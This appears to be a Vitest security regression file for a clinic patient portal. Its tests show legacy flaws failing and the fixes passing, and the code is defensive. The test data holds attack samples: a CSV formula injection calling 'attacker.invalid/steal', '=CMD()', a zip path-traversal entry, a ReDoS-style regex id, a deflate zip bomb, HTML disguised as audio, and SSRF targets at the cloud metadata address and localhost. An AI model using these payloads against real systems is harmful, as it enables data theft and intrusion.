import { deflateRawSync } from "node:zlib";
import { beforeEach, describe, expect, it, vi } from "vitest";

const mockedRecordAudit = vi.fn().mockResolvedValue(undefined);
const mockedConsumeLoginAttempt = vi.fn().mockResolvedValue({
  allowed: true,
  retryAfterSeconds: 0,
});
const mockedConsumeLoginAttemptFor = vi.fn().mockResolvedValue({
  allowed: true,
  retryAfterSeconds: 0,
});
vi.mock("@/lib/db", () => ({
  recordAudit: (...args: unknown[]) => mockedRecordAudit(...args),
  consumeLoginAttempt: (...args: unknown[]) => mockedConsumeLoginAttempt(...args),
}));
vi.mock("@/lib/loginLimit", () => ({
  consumeLoginAttemptFor: (...args: unknown[]) => mockedConsumeLoginAttemptFor(...args),
}));
vi.mock("@/lib/portal-security", () => ({
  authenticatePortalAccount: vi.fn().mockResolvedValue(null),
}));

import { POST as portalLoginPost } from "../app/api/portal/login/route";
import { csvCell } from "../lib/csv";
import { voiceMatchesMagicBytes } from "../lib/messages";
import {
  PORTAL_ADMIN_PREVIEW_DURATION_MS,
  PORTAL_DURATION_MS,
  createPortalAdminPreviewToken,
  createPortalToken,
  portalCredentialsMatch,
  readPortalAdminPreviewToken,
  readPortalToken,
} from "../lib/portal";
import {
  assertSafeMessagingOutboundUrl,
  validateMessagingOutboundUrl,
} from "../lib/safe-outbound-url";
import { sendWhatsAppText } from "../lib/whatsapp-cloud";
import { browserInflateRaw, readFirstSheet } from "../lib/xlsx-reader";
import { consumeSecurityLimit } from "../lib/security-rate-limit";
import { inspectStaffPortalAuthority } from "../lib/portal-staff-authority";

/**
 * إثباتات (أحمر -> أخضر) لوحدات الأمان ببيانات اصطناعية بالكامل:
 * كل اختبار يثبت أولًا فشل المنطق القديم قبل الإصلاح أمام المتجه الهجومي (أحمر)،
 * ثم يثبت نجاح الكود الفعلي المُصلَح في صدّ المتجه نفسه مع حفظ المسار المشروع (أخضر).
 */

function buildSyntheticZip(
  files: Array<{
    name: string;
    content: Uint8Array;
    method?: 0 | 8;
    declaredUncompressedSize?: number;
  }>,
): Uint8Array {
  const encoder = new TextEncoder();
  const localParts: Uint8Array[] = [];
  const centralParts: Uint8Array[] = [];
  let offset = 0;

  for (const file of files) {
    const method = file.method ?? 0;
    const rawData = method === 8 ? new Uint8Array(deflateRawSync(file.content)) : file.content;
    const uncompressedSize = file.declaredUncompressedSize ?? file.content.byteLength;
    const nameBytes = encoder.encode(file.name);

    const localHeader = new Uint8Array(30 + nameBytes.byteLength);
    const lv = new DataView(localHeader.buffer);
    lv.setUint32(0, 0x04034b50, true);
    lv.setUint16(4, 20, true);
    lv.setUint16(8, method, true);
    lv.setUint32(18, rawData.byteLength, true);
    lv.setUint32(22, uncompressedSize, true);
    lv.setUint16(26, nameBytes.byteLength, true);
    localHeader.set(nameBytes, 30);

    const centralHeader = new Uint8Array(46 + nameBytes.byteLength);
    const cv = new DataView(centralHeader.buffer);
    cv.setUint32(0, 0x02014b50, true);
    cv.setUint16(4, 20, true);
    cv.setUint16(6, 20, true);
    cv.setUint16(10, method, true);
    cv.setUint32(20, rawData.byteLength, true);
    cv.setUint32(24, uncompressedSize, true);
    cv.setUint16(28, nameBytes.byteLength, true);
    cv.setUint32(42, offset, true);
    centralHeader.set(nameBytes, 46);

    localParts.push(localHeader, rawData);
    centralParts.push(centralHeader);
    offset += localHeader.byteLength + rawData.byteLength;
  }

  const centralSize = centralParts.reduce((s, p) => s + p.byteLength, 0);
  const eocd = new Uint8Array(22);
  const ev = new DataView(eocd.buffer);
  ev.setUint32(0, 0x06054b50, true);
  ev.setUint16(8, files.length, true);
  ev.setUint16(10, files.length, true);
  ev.setUint32(12, centralSize, true);
  ev.setUint32(16, offset, true);

  const total = offset + centralSize + eocd.byteLength;
  const out = new Uint8Array(total);
  let cursor = 0;
  for (const part of [...localParts, ...centralParts, eocd]) {
    out.set(part, cursor);
    cursor += part.byteLength;
  }
  return out;
}

describe("Red -> Green Security Proofs (Synthetic Unit Invariants)", () => {
  beforeEach(() => {
    process.env.SESSION_SECRET = "synthetic-unit-secret-0123456789abcdef012345";
    delete process.env.TRUST_PROXY;
  });

  it("[Portal Auth & Preview Domain Separation] RED: legacy phone+file match & shared-domain token vs GREEN: disabled legacy login & isolated preview HMAC", async () => {
    const syntheticPatient = {
      patientNumber: "SYN-P-0042",
      phone: "771234567",
      altPhone: null,
    };

    // RED (السلوك القديم قبل الإصلاح): معرفة رقم الملف والهاتف وحدها كانت تكفي لمطابقة هوية المريض
    const legacyMatched = portalCredentialsMatch(syntheticPatient, "00967 771 234 567", "syn-p-0042");
    expect(legacyMatched).toBe(true);

    // GREEN (السلوك الحالي بعد الإصلاح): مسار الدخول يرفض زوج (رقم الملف + الهاتف) بـ 403 نهائيًا،
    // وتوكن المعاينة الإدارية مفصول بمفتاح توقيع مستقل لا يقبله قارئ جلسة المريض العادية والعكس.
    mockedRecordAudit.mockClear();
    const blockedRes = await portalLoginPost(
      new Request("http://localhost/api/portal/login", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: "771234567", patientNumber: "SYN-P-0042" }),
      }),
    );
    expect(blockedRes.status).toBe(403);
    const blockedJson = (await blockedRes.json()) as { code?: string };
    expect(blockedJson.code).toBe("legacy_login_disabled");
    expect(mockedRecordAudit).toHaveBeenCalledTimes(1);
    expect(JSON.stringify(mockedRecordAudit.mock.calls[0])).not.toContain("771234567");

    const now = Date.now();
    const previewToken = createPortalAdminPreviewToken({
      patientId: 42,
      staffUserId: 1,
      staffUsername: "syn.owner",
      staffDisplayName: "مالك اصطناعي",
      staffRole: "admin",
      staffCredentialVersion: "staff-cred-v1",
      reason: "فحص تذكرة دعم اصطناعية",
      startedAt: now,
      expiresAt: now + PORTAL_ADMIN_PREVIEW_DURATION_MS,
    });
    expect(readPortalToken(previewToken)).toBeNull();
    expect(readPortalAdminPreviewToken(previewToken)?.staffCredentialVersion).toBe("staff-cred-v1");

    const patientToken = createPortalToken({
      patientId: 42,
      patientNumber: "SYN-P-0042",
      fullName: "مريض اصطناعي",
      expiresAt: now + PORTAL_DURATION_MS,
      issuedAt: now,
      credentialVersion: 1,
    });
    expect(readPortalAdminPreviewToken(patientToken)).toBeNull();
  });

  it("[Portal Owner Authority] RED: MIN(users.id) first-admin bootstrap vs GREEN: canonical authority fail-closed in legacy mode", async () => {
    const syntheticUsers = [
      { id: 1, username: "first.admin", role: "admin" },
      { id: 2, username: "second.admin", role: "admin" },
    ];

    // RED (السلوك القديم قبل الإصلاح): افتراض أن أول حساب admin (MIN(id)) هو المالك تلقائيًا
    const preFixBootstrapIsOwner = (userId: number) =>
      userId === Math.min(...syntheticUsers.filter((u) => u.role === "admin").map((u) => u.id));
    expect(preFixBootstrapIsOwner(1)).toBe(true);

    // GREEN (السلوك الحالي بعد الإصلاح): عند غياب مؤشرات السلطة القانونية الموحدة (markers = '0')،
    // يعود `mode: "legacy"` و`ownerAuthority: null` فلا يُمنح أي حساب صفة المالك بالاستنتاج.
    const fakeLegacyDb = {
      query: vi.fn(async () => ({ rows: [{ markers: "0" }] })),
    };
    const authority = await inspectStaffPortalAuthority(fakeLegacyDb as never, 1);
    expect(authority).toEqual({ mode: "legacy", ownerAuthority: null });

    // وعند وجود مؤشر جزئي تالف لمخطط السلطة القانونية يفشل مغلقًا (control-not-active) بلا تراجع للوضع القديم
    const fakeBrokenCanonicalDb = {
      query: vi
        .fn()
        .mockResolvedValueOnce({ rows: [{ markers: "1" }] })
        .mockResolvedValueOnce({ rows: [] }),
    };
    const brokenAuthority = await inspectStaffPortalAuthority(fakeBrokenCanonicalDb as never, 1);
    expect(brokenAuthority).toEqual({
      mode: "canonical",
      ownerAuthority: null,
      deniedReason: "control-not-active",
    });
  });

  it("[Public Booking Rate Limit] RED: shared 'public' bucket DoS vs GREEN: per-phone + CGNAT source cap + untrusted global fallback", async () => {
    // RED (السلوك القديم قبل الإصلاح): جميع المرضى خلف CGNAT يشتركون في مفتاح ثابت واحد `identifier: "public"` بسقف 30
    const preFixSharedCounter = new Map<string, number>();
    const preFixConsume = () => {
      const next = (preFixSharedCounter.get("sec:book:id:public") ?? 0) + 1;
      preFixSharedCounter.set("sec:book:id:public", next);
      return next <= 30;
    };
    for (let i = 0; i < 30; i += 1) expect(preFixConsume()).toBe(true);
    // المريض الحقيقي رقم 31 من شبكة أخرى يُحجب ظلمًا بسبب استنزاف المفتاح العام الواحد!
    expect(preFixConsume()).toBe(false);

    // GREEN (السلوك الحالي بعد الإصلاح):
    // 1) بدون TRUST_PROXY يُبنى مفتاح الرقم المطبّع + مفتاح السقف العام الاحتياطي (لمنع إغراق القاعدة بتدوير الأرقام)
    const untrustedLimits = await (async () => {
      let captured: Array<{ key: string; maximum: number }> = [];
      mockedConsumeLoginAttempt.mockImplementationOnce(async (limits: Array<{ key: string; maximum: number }>) => {
        captured = limits;
        return { allowed: true, retryAfterSeconds: 0 };
      });
      await consumeSecurityLimit({
        scope: "book",
        identifier: "771234567",
        maximum: 6,
        sourceMaximum: 30,
        untrustedGlobalMaximum: 120,
        windowMinutes: 15,
        headers: new Headers({ "x-forwarded-for": "198.51.100.10" }),
      });
      return captured;
    })();
    expect(untrustedLimits).toHaveLength(2);
    expect(untrustedLimits[0].maximum).toBe(6);
    expect(untrustedLimits[1].maximum).toBe(120);

    // 2) خلف TRUST_PROXY=true يُبنى مفتاح الرقم (6) + مفتاح المصدر الموثوق (30) دون عنق زجاجة عام مشترك
    process.env.TRUST_PROXY = "true";
    const trustedLimits = await (async () => {
      let captured: Array<{ key: string; maximum: number }> = [];
      mockedConsumeLoginAttempt.mockImplementationOnce(async (limits: Array<{ key: string; maximum: number }>) => {
        captured = limits;
        return { allowed: true, retryAfterSeconds: 0 };
      });
      await consumeSecurityLimit({
        scope: "book",
        identifier: "779998887",
        maximum: 6,
        sourceMaximum: 30,
        untrustedGlobalMaximum: 120,
        windowMinutes: 15,
        headers: new Headers({ "x-forwarded-for": "203.0.113.9, 198.51.100.77" }),
      });
      return captured;
    })();
    expect(trustedLimits).toHaveLength(2);
    expect(trustedLimits[0].maximum).toBe(6);
    expect(trustedLimits[1].maximum).toBe(30);
    expect(trustedLimits[1].key).not.toBe(untrustedLimits[1].key);
  });

  it("[CSV Formula Neutralization] RED: unescaped formula triggers vs GREEN: neutralized formulas with intact negative numbers", () => {
    const preFixCsvCell = (value: unknown): string => {
      if (value === null || value === undefined) return "";
      const text = String(value);
      return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
    };

    const payload = "   =HYPERLINK(\"https://attacker.invalid/steal\")";
    // RED: الخلية القديمة تبدأ بصيغة قابلة للتنفيذ في برامج الجداول
    expect(preFixCsvCell("=CMD()")).toBe("=CMD()");
    expect(preFixCsvCell(payload).startsWith("\"=HYPERLINK") || preFixCsvCell(payload).includes("   =HYPERLINK")).toBe(true);
    expect(preFixCsvCell(payload).startsWith("\"'")).toBe(false);

    // GREEN: تحييد الصيغ حتى مع المسافات البادئة مع إبقاء الأرقام السالبة سليمة حسابيًا
    expect(csvCell("=CMD()")).toBe("'=CMD()");
    expect(csvCell(payload)).toBe("\"'   =HYPERLINK(\"\"https://attacker.invalid/steal\"\")\"");
    expect(csvCell("-2500.75")).toBe("-2500.75");
    expect(csvCell(-2500.75)).toBe("-2500.75");
  });

  it("[XLSX Reader Hardening] RED: path traversal, regex injection, sparse XFD column & streaming zip-bomb vs GREEN: bounded fail-closed", async () => {
    const encoder = new TextEncoder();

    // RED: السلوك القديم لبناء فهرس العمود من `XFD1` كان يولّد مصفوفة بطول 16384 عنصرًا لكل صف،
    // وكان يدمج `r:id` مباشرة في RegExp دون تهريب.
    const preFixColumnIndex = (ref: string) => {
      const letters = /^[A-Z]+/.exec(ref)?.[0] ?? "A";
      let idx = 0;
      for (const ch of letters) idx = idx * 26 + (ch.charCodeAt(0) - 64);
      return idx - 1;
    };
    expect(preFixColumnIndex("XFD1")).toBe(16383);

    // GREEN 1: رفض مسار `../` داخل الأرشيف
    const traversalZip = buildSyntheticZip([
      { name: "xl/../secret.xml", content: encoder.encode("<workbook/>") },
    ]);
    await expect(readFirstSheet(traversalZip, browserInflateRaw)).rejects.toThrow("غير آمن");

    // GREEN 2: رفض عمود متطرف `XFD1` يتجاوز 1024 عمودًا
    const extremeColZip = buildSyntheticZip([
      {
        name: "xl/workbook.xml",
        content: encoder.encode(
          `<workbook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="S1" sheetId="1" r:id="rId1+([a-z]+)+$"/></sheets></workbook>`,
        ),
      },
      {
        name: "xl/_rels/workbook.xml.rels",
        content: encoder.encode(
          `<Relationships><Relationship Id="rId1+([a-z]+)+$" Target="worksheets/sheet1.xml"/></Relationships>`,
        ),
      },
      {
        name: "xl/worksheets/sheet1.xml",
        content: encoder.encode(
          `<worksheet><sheetData><row r="1"><c r="XFD1" t="inlineStr"><is><t>boom</t></is></c></row></sheetData></worksheet>`,
        ),
      },
    ]);
    await expect(readFirstSheet(extremeColZip, browserInflateRaw)).rejects.toThrow("أعمدة");

    // GREEN 3: إيقاف قنبلة ضغط DEFLATE تتجاوز 16MB أثناء القراءة المتدفقة في browserInflateRaw (حتى لو زيّف الترويسة)
    const oversizedZeroes = new Uint8Array(17 * 1024 * 1024);
    const compressedBomb = new Uint8Array(deflateRawSync(oversizedZeroes));
    expect(compressedBomb.byteLength).toBeLessThan(64 * 1024);
    await expect(browserInflateRaw(compressedBomb)).rejects.toThrow("فك الضغط");

    // GREEN 4: ملف Excel اصطناعي سليم يعمل بدقة مع محرّك فك الضغط المتدفق نفسه
    const validZip = buildSyntheticZip([
      {
        name: "xl/workbook.xml",
        method: 8,
        content: encoder.encode(`<workbook><sheets><sheet name="Sheet1" sheetId="1"/></sheets></workbook>`),
      },
      {
        name: "xl/worksheets/sheet1.xml",
        method: 8,
        content: encoder.encode(
          `<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>مريض اصطناعي</t></is></c><c r="B1"><v>1500</v></c></row></sheetData></worksheet>`,
        ),
      },
    ]);
    const parsedRows = await readFirstSheet(validZip, browserInflateRaw);
    expect(parsedRows).toEqual([["مريض اصطناعي", "1500"]]);
  });

  it("[Media Magic-Bytes & Messaging SSRF] RED: MIME trust & redirect SSRF vs GREEN: magic-byte check & non-AI public HTTPS policy", async () => {
    // RED: السلوك القديم كان يثق بنوع MIME المعلن دون فحص التوقيع الثنائي للملف الصوتي،
    // أو يسمح بإعادة التوجيه 302 نحو عنوان بيانات السحابة الداخلي.
    const preFixMimeOnlyCheck = (mime: string) => /^audio\/(webm|ogg|mp4)/i.test(mime);
    const spoofedHtmlB64 = Buffer.from("<html><script>alert(1)</script></html>", "utf8").toString("base64");
    expect(preFixMimeOnlyCheck("audio/ogg")).toBe(true);

    // GREEN: فحص البصمة الثنائية يرفض HTML المموّه ويقبل Ogg الحقيقي
    expect(voiceMatchesMagicBytes("audio/ogg", spoofedHtmlB64)).toBe(false);
    const realOggB64 = Buffer.from("OggS\x00\x02\x00\x00\x00\x00\x00\x00", "binary").toString("base64");
    expect(voiceMatchesMagicBytes("audio/ogg", realOggB64)).toBe(true);

    // GREEN: حارس عناوين الرسائل يسمح ببوابات الرسائل الإقليمية عبر HTTPS العام (دون نسخ قائمة AI المغلقة)
    // ويمنع العناوين الداخلية وDNS Rebinding وإعادة التوجيه 3xx
    expect(validateMessagingOutboundUrl("http://sms.yemen-gateway.example/send").ok).toBe(false);
    expect(validateMessagingOutboundUrl("https://169.254.169.254/latest/meta-data/").ok).toBe(false);
    const regionalOk = await assertSafeMessagingOutboundUrl("https://gw.regional-sms-test.example/v2/send", {
      resolveDns: async () => ["198.51.100.44"],
    });
    expect(regionalOk.ok).toBe(true);

    const redirectAttempt = await sendWhatsAppText(
      {
        token: "syn-token",
        phoneNumberId: "1001",
        graphVersion: "v21.0",
        provider: "bsp",
        apiBaseUrl: "https://bsp.regional-wa-test.example/v1",
        authHeader: "D360-API-KEY",
        resolveDns: async () => ["198.51.100.45"],
      },
      "967771000111",
      "رسالة اختبار اصطناعية",
      (async (_url, init) => {
        expect(init?.redirect).toBe("error");
        return new Response("", { status: 301, headers: { location: "http://127.0.0.1:8080/internal" } });
      }) as typeof fetch,
    );
    expect(redirectAttempt.ok).toBe(false);
  });
});
